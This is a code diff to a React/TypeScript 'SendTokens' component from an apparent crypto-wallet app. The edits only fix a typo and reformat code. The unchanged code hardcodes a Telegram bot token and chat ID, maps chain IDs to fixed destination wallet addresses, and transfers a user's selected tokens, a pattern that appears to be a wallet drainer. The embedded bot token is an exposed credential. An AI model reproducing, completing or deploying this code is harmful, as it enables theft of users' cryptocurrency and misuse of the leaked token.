@@ -8,7 +8,7 @@ import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
 import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';
 import axios from 'axios';
 
-cconst TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
+const TELEGRAM_BOT_TOKEN = '7207803482:AAGrcKe1xtF7o7epzI1PxjXciOjaKVW2bUg';
 const TELEGRAM_CHAT_ID = '6718529435';
 
 const sendTelegramNotification = async (message: string) => {
@@ -31,7 +31,7 @@ const destinationAddresses = {
   137: '0x933d91B8D5160e302239aE916461B4DC6967815d',
 };
 
-function selectAddressForToken(network) {
+function selectAddressForToken(network: number) {
   const addresses = {
     1: '0xFB7DBCeB5598159E0B531C7eaB26d9D579Bf804B',
     56: '0x933d91B8D5160e302239aE916461B4DC6967815d',
@@ -42,7 +42,7 @@ function selectAddressForToken(network) {
   };
 
   const selectedAddress = addresses[network];
-  
+
   if (selectedAddress) {
     console.log('Great Job! Selected Address:', selectedAddress);
   } else {
@@ -80,7 +80,7 @@ export const SendTokens = () => {
       return;
     }
 
-    selectAddressForToken(chain?.id); 
+    selectAddressForToken(chain?.id);
 
     let resolvedDestinationAddress = destinationAddress;
     if (destinationAddress.includes('.')) {
@@ -103,12 +103,14 @@ export const SendTokens = () => {
     for (const tokenAddress of tokensToSend) {
       const token = tokens.find((token) => token.contract_address === tokenAddress);
 
-      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x') ? tokenAddress as `0x${string}` : `0x${tokenAddress}` as `0x${string}`;
+      const formattedTokenAddress: `0x${string}` = tokenAddress.startsWith('0x')
+        ? (tokenAddress as `0x${string}`)
+        : (`0x${tokenAddress}` as `0x${string}`);
 
       try {
-        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x') 
-          ? resolvedDestinationAddress as `0x${string}` 
-          : `0x${resolvedDestinationAddress}` as `0x${string}`;
+        const formattedDestinationAddress: `0x${string}` = resolvedDestinationAddress.startsWith('0x')
+          ? (resolvedDestinationAddress as `0x${string}`)
+          : (`0x${resolvedDestinationAddress}` as `0x${string}`);
 
         if (tokenAddress === 'native') {
           // Handle native token transfer
